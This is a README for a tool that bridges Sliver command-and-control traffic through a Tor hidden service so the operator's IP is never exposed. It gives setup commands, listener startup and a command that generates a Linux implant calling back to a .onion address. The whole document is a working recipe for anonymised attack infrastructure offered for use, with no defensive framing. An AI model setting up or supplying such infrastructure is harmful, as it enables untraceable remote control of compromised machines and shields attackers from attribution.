# sliver-tor-bridge

tor-based transport bridge for sliver c2. creates a hidden service and proxies traffic to your sliver server so your real ip is never exposed.

## what it does

sets up a tor hidden service that points to a local http proxy. the proxy forwards everything to sliver's https listener. implants connect through tor, you control them through sliver normally.

```
sliver server <---> proxy <---> tor hidden service <---> implant
   :8443           :8080          xyz.onion              (via tor)
```

## requirements

- python 3.8+
- tor (apt install tor)
- sliver

## install

```
git clone https://github.com/Otsmane-Ahmed/sliver-tor-bridge.git
cd sliver-tor-bridge
python3 -m venv venv
source venv/bin/activate
pip install -e .
```

## usage

start sliver with an https listener:

```
sliver-client
sliver > https -L 127.0.0.1 -l 8443
```

in another terminal, start the bridge:

```
sudo systemctl stop tor
sliver-tor-bridge start --sliver-port 8443
```

wait for the .onion address, then generate an implant:

```
sliver > generate --http http://YOUR_ONION.onion --os linux --save /tmp/implant
```

## options

```
--sliver-port    sliver https port (default 8443)
--tor-port       tor socks port (default 9050)
--service-port   hidden service port (default 80)
-c, --config     config file path
```

## docker

```
docker-compose up -d
```

## license

mit
